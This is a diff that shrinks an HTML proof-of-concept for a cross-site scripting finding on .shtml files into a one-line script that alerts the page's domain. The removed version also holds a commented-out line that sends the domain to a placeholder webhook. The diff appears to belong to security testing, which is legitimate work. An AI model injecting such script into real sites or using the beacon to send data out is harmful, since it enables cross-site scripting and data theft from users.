@@ -1,14 +1,1 @@
-<!doctype html>
-<html><head><title>loading</title></head>
-<body>
-<h1 id="marker">(if you see this as rendered HTML, it is already text/html)</h1>
-<script>
-  document.title = 'XSS-FIRED';
-  document.body.style.background = '#cc0000';
-  document.getElementById('marker').textContent =
-    'F2 .shtml XSS EXECUTED on ' + document.domain;
-  try { alert('F2 shtml XSS on ' + document.domain); } catch (e) {}
-  // Impact demo (point at a webhook you own):
-  // new Image().src='https://YOUR-WEBHOOK/?d='+encodeURIComponent(document.domain);
-</script>
-</body></html>
+<!doctype html><script>alert(document.domain)</script>
